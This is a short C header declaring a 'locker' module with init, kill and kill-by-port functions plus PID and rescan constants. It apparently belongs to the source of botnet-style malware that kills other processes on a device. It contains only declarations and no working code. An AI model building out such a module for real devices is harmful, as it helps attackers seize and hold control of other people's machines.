#pragma once

#include "includes.h"

#define LOCKER_MIN_PID 400
#define LOCKER_RESTART_SCAN_TIME 600

void locker_init(void);
void locker_kill(void);
BOOL locker_kill_by_port(port_t);
